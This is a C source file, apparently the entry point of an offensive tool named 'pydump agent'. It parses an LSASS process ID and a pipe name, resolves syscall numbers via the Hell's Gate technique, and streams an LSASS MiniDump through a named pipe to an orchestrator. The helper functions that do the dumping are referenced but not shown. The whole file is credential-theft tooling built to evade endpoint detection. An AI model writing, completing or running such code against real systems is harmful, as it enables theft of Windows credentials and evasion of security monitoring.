/**
 * pydump agent — entry point.
 *
 * Usage: agent.exe <LSASS_PID> <PIPE_NAME>
 *
 * 1. Resolves syscall numbers from ntdll (Hell's Gate)
 * 2. Opens LSASS by PID
 * 3. Creates a named pipe (\\.\pipe\<PIPE_NAME>)
 * 4. Streams the LSASS dump in MiniDump format through the pipe
 * 5. Exits cleanly
 */

#include <windows.h>
#include "../include/syscalls.h"
#include "../include/agent.h"

// Simple wide-string to int
static DWORD wtoi(const wchar_t *s) {
    DWORD val = 0;
    while (*s >= L'0' && *s <= L'9') {
        val = val * 10 + (*s - L'0');
        s++;
    }
    return val;
}

// Entry point — no CRT dependency for smaller binary
void main_entry(void) {
    // Parse command line: "agent.exe <PID> <PIPE_NAME>"
    wchar_t *cmdline = GetCommandLineW();

    // Skip executable name
    wchar_t *p = cmdline;
    if (*p == L'"') {
        p++;
        while (*p && *p != L'"') p++;
        if (*p) p++;
    } else {
        while (*p && *p != L' ') p++;
    }
    while (*p == L' ') p++;

    // Parse PID
    DWORD pid = wtoi(p);
    while (*p && *p != L' ') p++;
    while (*p == L' ') p++;

    // Remaining is pipe name
    wchar_t *pipe_name = p;
    // Trim trailing whitespace/newline
    wchar_t *end = pipe_name;
    while (*end && *end != L' ' && *end != L'\r' && *end != L'\n') end++;
    *end = L'\0';

    if (pid == 0 || pipe_name[0] == L'\0') {
        ExitProcess(1);
    }

    // Step 1: Resolve syscalls
    if (!resolve_syscalls()) {
        ExitProcess(2);
    }

    // Step 2: Create named pipe and wait for orchestrator
    HANDLE pipe = open_named_pipe(pipe_name);
    if (!pipe) {
        ExitProcess(3);
    }

    // Step 3: Dump LSASS and stream through pipe
    BOOL success = dump_lsass(pid, pipe);

    // Step 4: Cleanup
    close_pipe(pipe);

    ExitProcess(success ? 0 : 4);
}
